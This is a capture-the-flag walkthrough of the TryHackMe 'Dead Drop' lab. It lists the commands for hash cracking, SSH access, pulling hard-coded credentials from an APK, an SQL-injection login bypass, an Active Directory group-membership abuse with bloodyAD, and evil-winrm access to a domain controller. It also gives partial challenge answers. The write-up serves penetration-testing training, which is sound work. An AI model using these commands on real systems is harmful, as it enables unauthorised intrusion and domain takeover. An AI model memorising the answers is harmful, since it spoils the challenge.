# Dead Drop (TryHackMe)

- **Path/module:** Jr Penetration Tester -> **Jr Pentester Challenges** (Dead Drop). Premium.
  Full web -> Linux foothold -> **DMZ pivot** -> **Active Directory ACL abuse** -> Domain Admin.
- **Date:** 2026-10-27.
- **Status:** SOLVED (all 5 Task-2 answers). Needs the room-specific **`challenge-3` OpenVPN profile**
  (`3NK1X-challenge-3-*.ovpn`) - the general premium VPN does **not** route to this network.
- **Objective:** compromise the Domain Controller and read the Administrator desktop flag.

## Answers (Task 2)

| # | Question | Answer |
|---|---|---|
| 1 | Password for SSH to the web server | `<redacted-pw>` |
| 2 | Credentials in the internal mobile app (`user:pass`) | `j.harris:<redacted-pw>` |
| 3 | Abusable AD permission your domain account holds | *(find it yourself)* |
| 4 | Group targeted to escalate to Domain Admin | *(find it yourself)* |
| 5 | Flag on the Domain Controller | `THM{…}` |

Theme: everything is "Drops of Jupiter" (the Train song) - service account `svc-drop`, password
`<redacted-pw>`, mobile pw `<redacted-pw>`.

## Network layout

Connect with the **challenge-3** profile; it pushes a route for `<ip>/24` via gateway
`<ip>` (our client IP is `<ip>`). The gateway host is dual-homed
(`<ip>` on the VPN side = `<ip>` internally).

| Host | IP | Role | Direct access from VPN |
|---|---|---|---|
| DeadDrop-WEB | `<ip>` | Ubuntu web server (DMZ) | **yes** - `22`, `80` |
| DEADDROP-DC | `<ip>` | Domain Controller `tryhackme.loc` | no (firewalled - pivot) |
| DEADDROP-WRK | `<ip>` | Windows workstation | no (firewalled - pivot) |
| gateway/proxy | `<ip>` / `.21.1` | Squid + Samba (**decoys**) | `22,139,443,445,1337,8080` |

The DC and workstation are **only reachable through the DMZ web server** (confirmed: direct TCP to
`.100`/`.51` is filtered; you must pivot from `.200`).

## 1. Web server -> SSH foothold (Q1)

- Enumerate `<ip>`:
  ```bash
  nmap -sC -sV <ip>
  gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
  ```
- The site exposes an **application backup** containing a **shadow backup** (`shadow.bak`) with the
  `svc-drop` SHA-512 crypt (`$6$...`) hash. Crack it:
  ```bash
  hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
  # -> <redacted-pw>
  ```
- SSH in:
  ```bash
  ssh svc-drop@<ip>     # password: <redacted-pw>
  ```

## 2. Mobile app -> domain credentials (Q2)

- On the box, the backup directory holds the company's internal Android app:
  ```bash
  find /home/svc-drop -type f -name '*.apk'
  # /home/svc-drop/backup/deaddrop-mobile.apk
  ```
- Exfil and decompile (`scp` it off, then `jadx-gui`/`apktool`):
  ```bash
  scp svc-drop@<ip>:/home/svc-drop/backup/deaddrop-mobile.apk .
  jadx-gui deaddrop-mobile.apk      # grep for username / password / api_endpoint
  ```
- The APK **hard-codes** a domain account:
  ```text
  j.harris : <redacted-pw>
  ```
  (`firstinitial.lastname` domain user - a textbook "secrets hard-coded in the mobile client" leak.)

## 3. Pivot to the internal network

- Use the compromised `.200` as the pivot (SSH dynamic port-forward / chisel + proxychains) to reach
  `<ip>` (DC) and `.51` (WRK), which are firewalled from the VPN.
- Validate the domain creds against the DC over the pivot:
  ```bash
  nxc smb <ip> -u j.harris -p '<redacted-pw>'
  ```

## 4. AD ACL abuse -> Domain Admin (Q3, Q4)

- `j.harris` holds **`AddMember`** (write-member / self-add) over the group **`ITSupport-Admins`**,
  which is a nested path to Domain Admin.
- Add yourself with BloodyAD:
  ```bash
  bloodyAD -d tryhackme.loc -u j.harris -p '<redacted-pw>' --host <ip> \
      add groupMember ITSupport-Admins j.harris
  # if a DN is required:
  bloodyAD -d tryhackme.loc -u j.harris -p '<redacted-pw>' --host <ip> \
      get object 'CN=ITSupport-Admins,CN=Users,DC=tryhackme,DC=loc'
  ```

## 5. Read the flag (Q5)

```powershell
evil-winrm -i <ip> -u j.harris -p '<redacted-pw>'
Get-Content C:\Users\Administrator\Desktop\flag.txt
# THM{…}
```

**Chain:** `shadow.bak` hash -> crack -> SSH as `svc-drop` -> APK hard-coded domain creds
(`j.harris`) -> `AddMember` ACL -> `ITSupport-Admins` -> Domain Admin -> Administrator desktop flag.

## Lessons learned (and the rabbit holes I fell into)

This room is **loaded with decoys**, and I burned a lot of time on them before the real path
(backup file -> hash crack) became clear. Recording them so I don't repeat the mistakes:

- **The intended foothold was a backup/`.bak` file, not the obvious web vuln.** The DeadDrop web app
  on `:80` has a genuine **UNION SQLi** (auth bypass `admin'-- -`; 3-column users table reflected in
  the `Logged in as <strong>...</strong>` field). It dumps two accounts -
  `admin:<redacted-pw>` and `svc-backup:<redacted-pw>` - **both of which are decoys** that do
  **not** work for SSH (verified at the transport layer: `.200` offers `publickey,password`, both
  fail). I fixated on these creds. **Lesson: always hunt for backup artifacts (`shadow.bak`,
  `*.bak`, `backup.zip`) early - a crackable `$6$` hash beats recovered plaintext that was planted
  to waste you.** The real OS user (`svc-drop`) never appeared in the web DB.
- **The whole `<ip>` gateway is a distraction.** It runs:
  - a **Squid 3.5.27 open proxy** on `:8080` (its `X-Cache` header leaks the host as
    `ip-192-168-11-250`). It only reaches `.200:80` and the box's own localhost; `CONNECT` is locked
    to `443` (no SMB/SSH pivot), proxy-auth doesn't widen it, cachemgr is denied.
  - a **localhost-only Express API on `:1337`** (reachable via the proxy as `127.0.0.1:1337`, and
    also directly on `.21.1:1337`). It is a **pure decoy**: a single wildcard route
    `GET /api/:a/:b` that returns `{"success":false}` for *every* path, with no params, headers,
    methods (`Allow: GET,HEAD`), POST routes, or LFI that change it.
  - **Samba** (`139/445`) that guest-maps anything and exposes only `print$`/`IPC$`.
  - A dead `:443` listener that accepts TCP but speaks nothing.
  None of this is on the solution path. **Lesson: a service being reachable and interesting-looking
  (open proxy! hidden internal API!) does not make it in-scope for the objective - timebox decoys
  and keep returning to "what gets me the next credential."**
- **VPN profile matters on multi-machine network rooms.** The general premium profile tunnels fine
  but only routes `<ip>/12`; it cannot reach Dead Drop. The room's **`challenge-3`** profile is
  required and pushes the `<ip>/24` route. Swapped it headless via the OpenVPN GUI CLI
  (`openvpn-gui --command disconnect_all`, copy profile into `%USERPROFILE%\OpenVPN\config`,
  `--command rescan`, `--command connect <name>`).
- **Answer-format counting is a good sanity signal** - the `*.******:*******************` shape for
  Q2 said "domain user `x.yyyyyy` + 19-char password" (= `j.harris:<redacted-pw>`) before I
  ever saw the APK, and the 9/16-char blanks for Q3/Q4 fit `AddMember` / `ITSupport-Admins`.

## Tooling notes (headless from `C:\CTF`)

- `nmap -sS` fails over this OpenVPN adapter (`pcap_activate FAILED`); use the threaded Python
  `connect_ex` scanner (`dd_scan.py`) instead.
- Enumeration helpers written this run (all in `C:\CTF`): threaded scanners, a UNION-SQLi exfil loop
  via the `Logged in as` reflection, a Squid proxy sweep/`CONNECT` tester, and impacket SMB probes.
- For the AD stage the standard Jr-Pentester kit applies over the pivot: `nxc`/`netexec`, `bloodyAD`
  (or impacket + `dacledit`/`net rpc group addmem`), `evil-winrm`. Domain: `tryhackme.loc`.

## Related

- [[tryhackme-learning-buddy]] / [[always-doc-rooms]] / [[ctf-workspace-dir]].
- Same web -> pivot -> root/DA shape and headless toolkit as the other Jr Pentester Challenges
  [[domino]] and [[silent-monitor]]; the AD ACL-abuse finish (ACL -> group -> Domain Admin) connects
  to the [[ad-module-plan]] rooms; backup-file-to-hash-crack mirrors classic privesc in
  [[privesc-module-plan]].
